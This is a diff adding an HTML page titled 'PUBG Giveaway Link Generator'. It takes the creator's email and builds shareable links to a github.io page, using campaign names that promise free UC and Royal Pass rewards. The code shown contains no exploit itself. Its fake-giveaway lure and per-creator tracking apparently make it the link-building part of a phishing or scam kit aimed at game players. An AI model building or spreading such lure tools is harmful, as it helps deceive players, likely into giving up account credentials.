@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Giveaway Link Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            width: 400px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .link-box {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border: 2px dashed #28a745;
+            border-radius: 8px;
+        }
+        .link {
+            word-break: break-all;
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .campaign-name {
+            background: #ffeb3b;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🎁 PUBG Giveaway Link Generator</h2>
+        <p>Create your unique giveaway link</p>
+        
+        <form id="emailForm">
+            <input type="email" id="creatorEmail" placeholder="Enter your email address" required>
+            <button type="submit">🎯 Generate Giveaway Link</button>
+        </form>
+
+        <div id="linkBox" class="link-box">
+            <div class="campaign-name" id="campaignName"></div>
+            <h3>✅ Your Giveaway Link is Ready!</h3>
+            <div class="link" id="generatedLink"></div>
+            
+            <button onclick="copyLink()">📋 Copy Link</button>
+        </div>
+    </div>
+
+    <script>
+        const giveawayNames = [
+            "PUBG_UC_GIVEAWAY_2024", "FREE_UC_EVENT", "PUBG_REWARDS_PROGRAM", 
+            "UC_GIVEAWAY_FEST", "BATTLEGROUNDS_BONUS", "PREMIUM_UC_OFFER",
+            "ELITE_REWARDS_EVENT", "ROYAL_PASS_GIVEAWAY", "VICTORY_REWARDS_PROGRAM",
+            "SEASONAL_UC_BONUS", "PREMIUM_LOOT_EVENT", "BATTLE_REWARDS_FEST"
+        ];
+        const usedNames = new Set();
+
+        function getRandomGiveawayName() {
+            const availableNames = giveawayNames.filter(name => !usedNames.has(name));
+            if (availableNames.length === 0) {
+                return `UC_GIVEAWAY_${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
+            }
+            const randomName = availableNames[Math.floor(Math.random() * availableNames.length)];
+            usedNames.add(randomName);
+            return randomName;
+        }
+
+        document.getElementById('emailForm').onsubmit = function(e) {
+            e.preventDefault();
+            const creatorEmail = document.getElementById('creatorEmail').value;
+            
+            if (!creatorEmail.includes('@')) {
+                alert('Please enter a valid email address');
+                return false;
+            }
+            
+            const campaignName = getRandomGiveawayName();
+            const uniqueId = Math.random().toString(36).substr(2, 12);
+            
+            // ✅ UPDATED FOR ROOT LEVEL
+            const fullLink = `https://hacximmund.github.io/PUBG-UC/link.html?campaign=${encodeURIComponent(campaignName)}&creator=${encodeURIComponent(creatorEmail)}&id=${uniqueId}`;
+            
+            document.getElementById('campaignName').textContent = `🎯 Campaign: ${campaignName}`;
+            document.getElementById('generatedLink').textContent = fullLink;
+            document.getElementById('linkBox').style.display = 'block';
+            
+            return false;
+        };
+
+        function copyLink() {
+            const linkText = document.getElementById('generatedLink').textContent;
+            navigator.clipboard.writeText(linkText).then(() => {
+                alert('✅ Giveaway link copied! Share with friends.');
+            });
+        }
+    </script>
+</body>
+</html>
